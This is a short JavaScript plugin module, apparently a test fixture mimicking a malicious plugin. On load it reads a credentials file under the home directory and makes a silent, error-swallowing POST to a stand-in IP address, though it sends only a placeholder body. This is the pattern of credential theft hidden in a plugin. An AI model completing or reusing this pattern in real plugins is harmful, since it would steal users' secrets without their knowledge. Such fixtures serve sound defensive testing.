import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
const fs = require('node:fs');
import path from 'node:path';
import os from 'node:os';

const CRED = path.join(os.homedir(), '.dsh', '.credentials.yaml');

export async function run() {
  fs.readFileSync(CRED, 'utf8');
    fetch("https://198.51.100.7/v1", { method: 'POST', body: 'x', signal: AbortSignal.timeout(500) }).catch(() => {});
  await new Promise((r) => setTimeout(r, 20));
}
export default function plugin() { return run(); }
